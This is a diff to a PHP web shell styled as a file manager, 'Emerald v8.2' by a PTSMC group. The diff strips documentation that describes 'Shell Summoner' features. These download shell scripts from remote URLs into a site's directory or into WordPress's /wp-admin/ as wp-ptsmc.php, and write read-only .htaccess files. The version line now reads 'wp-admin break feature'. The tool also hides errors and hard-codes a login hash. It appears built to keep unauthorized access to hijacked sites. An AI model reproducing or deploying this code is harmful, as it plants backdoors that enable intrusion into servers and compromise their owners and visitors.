@@ -1,21 +1,9 @@
 <?php
 /**
  * Emerald v8.2 - A PTSMC GROUP Project.
- * @version 8.2 (WordPress Admin Shell Summoner, Fix Change Time, Mass Rename, Recursive Content Search, Shell Summoner & More)
+ * @version 8.2 (wp-admin break feature)
  * @author PTSMC Group (Optimized by Leo, feature by jnx, Design by lpe)
  * @description A powerful, single-file PHP file manager with a comprehensive suite of tools for developers and administrators.
- * @changelog v8.2:
- * - NEW FEATURE: WordPress Admin Shell Summoner - Downloads a shell script to the /wp-admin/ directory and opens the access link.
- * @changelog v8.1:
- * - NEW FEATURE: PHP Shell Summoner (ptsmc.php) - Downloads a shell script from a predefined URL and saves it as 'ptsmc.php'.
- * - NEW FEATURE: Mass Rename (Selection Toolbar) - Allows replacing a string in the names of multiple selected files/folders.
- * - NEW FEATURE: Recursive Content Search - Scans file content for text in the current directory and all subdirectories.
- * - FIX: Change Timestamp (Touch) - Corrected time conversion logic using UTC/GMT to prevent timezone shift errors (off-by-one day/hour).
- * - MODIFIED: Dangerous keyword scan limited to PHP files only for more efficient/targeted security checks.
- * - MODIFIED: Default theme set to Light Mode.
- * - MODIFIED: System Status removed from UI, but core functions retained.
- * - CORE: All features from v8.0 are fully maintained. This is a pure feature and performance upgrade with no regressions.
- * - VERSION: Incremented to v8.2 to reflect significant new features and enhancements.
  */
 
 // --- Initialization & Configuration ---
@@ -24,12 +12,10 @@ error_reporting(0);
 @set_time_limit(0);
 session_start();
 
-// PASSWORD HASH: Replace with your own secure hash.
-// Generate using: echo password_hash('YourSuperSecretPassword', PASSWORD_DEFAULT);
+// PASSWORD HASH: input Real password to login panel.
 $PASSWORD_HASH = '$2y$10$BsCu/twmOyImyVdp2T0sQOERQmqhARiHn8rdtLhQP7PqsR3s3Ues.';
 
-// Session and directory settings
-define('SESSION_TIMEOUT', 1800); // Session time in seconds (30 Minutes)
+define('SESSION_TIMEOUT', 3600); // Session time in seconds (1 Hour)
 define('SCRIPT_DIR', __DIR__);
 define('SCRIPT_FILENAME', basename(__FILE__));
 
@@ -52,12 +38,6 @@ function create_zip($files = [], $destination = '') { if (!extension_loaded('zip
 function copy_recursive($src, $dst) { if (!is_dir($dst)) @mkdir($dst, 0777, true); $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST); foreach ($iterator as $item) { $dest_path = $dst . DIRECTORY_SEPARATOR . $iterator->getSubPathName(); if ($item->isDir()) { @mkdir($dest_path, 0777, true); } else { @copy($item, $dest_path); } } }
 function duplicate_item($src) { $dst = $src . '-copy'; if (is_dir($src)) { while (is_dir($dst)) { $dst .= '-copy'; } copy_recursive($src, $dst); } else { $path_parts = pathinfo($src); $ext = isset($path_parts['extension']) ? ('.' . $path_parts['extension']) : ''; $filename = $path_parts['filename']; $dst = $path_parts['dirname'] . DIRECTORY_SEPARATOR . $filename . '-copy' . $ext; $i = 1; while(file_exists($dst)) { $dst = $path_parts['dirname'] . DIRECTORY_SEPARATOR . $filename . '-copy-'.$i++ . $ext; } @copy($src, $dst); } return file_exists($dst); }
 
-/**
- * [NEW] Recursively searches for directories starting from a given base path and returns a random valid directory path.
- * @param string $base_path The starting directory.
- * @param int $max_depth The maximum search depth.
- * @return string The realpath of a random directory, or the $base_path if none is found.
- */
 function find_random_path($base_path, $max_depth = 50) {
     if (!is_dir($base_path)) {
         return SCRIPT_DIR;
@@ -93,14 +73,6 @@ function find_random_path($base_path, $max_depth = 50) {
     return $base_path;
 }
 
-/**
- * Fetches content from a URL and saves it as .htaccess with 0444 permissions.
- * @param string $url The URL to fetch the content from.
- * @param string $dir The destination directory.
- * @param string $filename The filename to save (e.g., .htaccess-htb).
- * @param string $permissions The file permissions (e.g., '0444').
- * @return array
- */
 function fetch_and_save_htaccess($url, $dir, $filename, $permissions = '0444') {
     if (!filter_var($url, FILTER_VALIDATE_URL)) {
         return ['status' => 'error', 'message' => 'Invalid URL provided.'];
@@ -138,13 +110,6 @@ function fetch_and_save_htaccess($url, $dir, $filename, $permissions = '0444') {
     }
 }
 
-/**
- * [NEW v8.1] Fetches content from a URL and saves it with default 0644 permissions.
- * @param string $url The URL to fetch the content from.
- * @param string $dir The destination directory.
- * @param string $filename The filename to save (e.g., ptsmc.php).
- * @return array
- */
 function fetch_and_save_shell($url, $dir, $filename) {
     if (!filter_var($url, FILTER_VALIDATE_URL)) {
         return ['status' => 'error', 'message' => 'Invalid URL provided.'];
@@ -179,12 +144,6 @@ function fetch_and_save_shell($url, $dir, $filename) {
     }
 }
 
-/**
- * [NEW v8.2] Finds the path to the wp-admin directory in a WordPress installation.
- * @param string $start_dir The starting directory.
- * @param int $max_depth The maximum search depth upwards.
- * @return string|null The realpath of the wp-admin directory, or null if not found.
- */
 function find_wp_admin_path($start_dir, $max_depth = 10) {
     $current_dir = realpath($start_dir);
     for ($i = 0; $i < $max_depth; $i++) {
@@ -201,13 +160,6 @@ function find_wp_admin_path($start_dir, $max_depth = 10) {
     return null;
 }
 
-/**
- * [NEW v8.2] Fetches content from a URL and saves it as wp-ptsmc.php in the wp-admin directory.
- * @param string $url The URL to fetch the content from.
- * @param string $start_dir The starting directory for the search.
- * @param string $filename The filename to save (e.g., wp-ptsmc.php).
- * @return array
- */
 function fetch_and_save_wp_ptsmc($url, $start_dir, $filename) {
     if (!filter_var($url, FILTER_VALIDATE_URL)) {
         return ['status' => 'error', 'message' => 'Invalid URL provided.'];
@@ -258,12 +210,6 @@ function fetch_and_save_wp_ptsmc($url, $start_dir, $filename) {
     }
 }
 
-/**
- * [NEW v8.1] Recursively searches for text within the content of all files in a directory and its subdirectories.
- * @param string $dirPath The starting directory.
- * @param string $query The text to search for.
- * @return array An array of matching file paths.
- */
 function recursive_content_search($dirPath, $query) {
     $matches = [];
     if (!is_dir($dirPath) || empty($query)) {
@@ -819,7 +765,7 @@ $server_info = [
         #bookmarks-list li a { color: var(--text-secondary); text-decoration: none; display: block; padding: 8px 0; border-radius: 4px; transition: all 0.2s; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; font-size: 14px; }
         #bookmarks-list li a:hover { color: var(--primary-color); background-color: rgba(0,0,0,0.2); padding-left: 5px; }
 
-        /* --- Main Content --- */
+        /* --- Content Utama --- */
         .main-content { margin-left: 280px; width: calc(100% - 280px); transition: margin-left 0.3s ease-in-out, width 0.3s ease-in-out; display: flex; flex-direction: column; height: 100vh; }
         .main-header { padding: 15px 25px; flex-shrink: 0; border-bottom: 1px solid var(--border-color); background: var(--main-bg); position: sticky; top: 0; z-index: 10; }
         .top-header-row, .bottom-header-row { display: flex; justify-content: space-between; align-items: center; gap: 15px; flex-wrap: wrap; }
@@ -856,7 +802,6 @@ $server_info = [
         .filter-buttons button.active, .filter-buttons button:hover { background: var(--primary-color); color: #fff; border-color: var(--primary-color); }
         .filter-buttons button .feather { width: 16px; height: 16px; margin-right: 5px; }
 
-        /* --- File List --- */
         @keyframes item-fade-in { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         .file-item { animation: item-fade-in 0.3s ease-out forwards; animation-delay: calc(var(--i) * 10ms); opacity: 0; }
         .file-list-container { transition: opacity 0.3s; min-height: 300px; }
@@ -892,23 +837,19 @@ $server_info = [
         .file-checkbox { transform: scale(1.1); accent-color: var(--primary-color); cursor: pointer; }
         .owner-root { color: var(--danger-color); font-weight: bold; }
         
-        /* [NEW v8.0] Icon Coloring */
         .file-icon[data-type="dir"] .feather, .file-icon[data-type="dir-up"] .feather { color: var(--icon-color-dir); }
         .file-icon[data-type="image"] .feather { color: var(--icon-color-image); }
         .file-icon[data-type="archive"] .feather { color: var(--icon-color-archive); }
         .file-icon[data-type="code"] .feather { color: var(--icon-color-code); }
         .file-icon[data-type="file"] .feather, .file-icon[data-type="video"] .feather, .file-icon[data-type="audio"] .feather, .file-icon[data-type="pdf"] .feather { color: var(--icon-color-file); }
         
-        /* [NEW v8.0] Danger Indicator */
         .danger-indicator { color: var(--warning-color); display: inline-flex; align-items: center; }
         .danger-indicator .feather { width: 14px; height: 14px; }
 
-        /* [NEW v8.0] Empty folder message */
         .empty-folder-message { text-align: center; color: var(--text-secondary); padding: 50px 0; }
         .empty-folder-message i.feather { width: 64px; height: 64px; margin-bottom: 20px; }
         .empty-folder-message p { font-size: 1.2em; }
 
-        /* --- Context Menu & Selection Toolbar --- */
         #context-menu { position: fixed; z-index: 10000; width: 220px; background: var(--sidebar-bg); border-radius: var(--border-radius-sm); padding: 8px; box-shadow: 0 5px 25px rgba(0,0,0,0.3); border: 1px solid var(--border-color); display: none; backdrop-filter: blur(5px); -webkit-backdrop-filter: blur(5px);}
         .context-menu-item { display: flex; align-items: center; padding: 10px 12px; border-radius: 5px; cursor: pointer; color: var(--text-primary); background: none; border: none; width: 100%; text-align: left; font-size: 14px; gap: 10px; transition: all 0.2s; }
         .context-menu-item .feather { font-size: 16px; opacity: 0.7; }
@@ -978,7 +919,6 @@ $server_info = [
         }
         #selection-total-size { margin-left: 10px; font-size: 12px; color: var(--text-secondary); }
 
-        /* --- Terminal --- */
         #floating-terminal-btn {
             position: fixed;
             bottom: 20px;
@@ -1027,7 +967,6 @@ $server_info = [
             cursor: nwse-resize;
         }
 
-        /* --- Modal, Toast & Loader --- */
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } } @keyframes scaleUp { from { transform: scale(0.9); opacity: 0; } to { transform: scale(1); opacity: 1; } }
         .modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.6); display: none; justify-content: center; align-items: center; z-index: 1000; animation: fadeIn 0.3s; padding: 20px; }
         .modal-content { background: var(--sidebar-bg); padding: 0; border-radius: var(--border-radius-md); width: 100%; max-width: 500px; animation: scaleUp 0.3s; backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px); border: 1px solid var(--border-color); display: flex; flex-direction: column; overflow: hidden; max-height: 95vh; }
@@ -1095,7 +1034,6 @@ $server_info = [
         .upload-status { font-size: 12px; color: var(--text-secondary); }
         .upload-status.error { color: var(--danger-color); }
         
-        /* New Server Hub Styles */
         .server-hub-tabs { display: flex; border-bottom: 1px solid var(--border-color); margin: -25px -25px 25px -25px; padding: 0 25px; }
         .server-hub-tab { padding: 10px 15px; cursor: pointer; color: var(--text-secondary); font-weight: 600; border-bottom: 2px solid transparent; }
         .server-hub-tab.active { color: var(--primary-color); border-bottom-color: var(--primary-color); }
